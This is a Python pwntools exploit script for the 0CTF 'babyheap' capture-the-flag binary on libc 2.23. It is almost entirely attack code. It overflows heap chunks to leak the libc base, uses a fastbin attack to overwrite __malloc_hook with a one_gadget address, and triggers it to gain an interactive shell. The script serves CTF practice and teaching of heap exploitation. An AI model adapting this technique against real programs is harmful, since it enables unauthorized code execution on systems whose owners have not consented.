# Tested on libc 2.23

from pwn import *
elf = ELF('./0ctfbabyheap')

#conn = remote('127.0.0.1', 12123)
#conn = process(['./0ctfbabyheap'], env={"LD_PRELOAD":"./libc.so.6"})
conn = process(['./0ctfbabyheap'])

def Allocate(size):
    #conn.recvuntil('Command: ')
    conn.recv()
    conn.sendline('1')
    conn.recvuntil('Size: ')
    conn.sendline(str(size))

def Fill(idx, size, content):
    conn.recv()
    conn.sendline('2')
    conn.recvuntil('Index: ')
    conn.sendline(str(idx))
    conn.recvuntil('Size: ')
    conn.sendline(str(size))
    conn.recvuntil('Content: ')
    conn.send(content)

def Free(idx):
    conn.recv()
    conn.sendline('3')
    conn.recvuntil('Index: ')
    conn.sendline(str(idx))

def Dump(idx):
    conn.recv()
    conn.sendline('4')
    conn.recvuntil('Index: ')
    conn.sendline(str(idx))

def Exit():
    conn.recv()
    conn.sendline('5')


if __name__ == "__main__":
    #pause()
    Allocate(0x20) #0 # size = 0x30 -> fastbin
    Allocate(0x20) #1
    Allocate(0x20) #2
    Allocate(0x20) #3
    Allocate(0x80) #4 # size = 0x90 -> smallbin
    Allocate(0x20) #5 # to prevent smallbin from being a top chunk

    # Leak libc
    Free(2)
    Free(1)

    Fill(3, 0x30, 'A'*0x20+p64(0x00)+p64(0x31) )
    Fill(0, 0x30+1, 'A'*0x20+p64(0x00)+p64(0x31)+'\xC0') # overwrite 1byte
    Allocate(0x20) #1 # dummy
    Allocate(0x20) #2 # manipulated chunk 

    Fill(3, 0x30, 'A'*0x20+p64(0x00)+p64(0x91) ) #restore the size
    Free(4) # smallbin's FD, BK will point to libc
    Dump(2)
    conn.recvuntil('Content: \n')
    libc_base = u64(conn.recv(8)) - 0x3c3b78
    log.info("libc_base : %x" % libc_base)
    Allocate(0x80) #4 allocation for convenient index
    # Until here we have index of #0 ~ #5

    # Change the function pointer of malloc_hook to the address of gadget
    malloc_hook = libc_base+0x3c3b00-0x13 # malloc_hook-0x13
    Allocate(0x60) #6
    Free(6)
    Fill(5, 0x30+0x8, 'A'*0x20+p64(0x00)+p64(0x70)+p64(malloc_hook))
    Allocate(0x60) #6 #dummy
    Allocate(0x60) #7 #malloc_hook-0x13
    #Fill(7, 0x13+0x8, 'A'*3+p64(libc+0x85270)+p64(libc+0x84e50)+p64(0xAAAAAAAA))

    magicgadget = libc_base+0xEF6C4

    #Fill(7, 0x13+0x8, 'A'*0x3+p64(0x00)*2+p64(0xAAAAAAAA))
    #Fill(7, 0x13+0x8, 'A'*0x3+p64(0x00)*2+p64(libc_base+0x41374))
    Fill(7, 0x13+0x8, 'A'*0x3+p64(0x00)*2+p64(libc_base+0x4526a)) #libc 2.23
    
    Allocate(0x20) # trigger to call _malloc_hook
    conn.interactive()
    #pause()


    






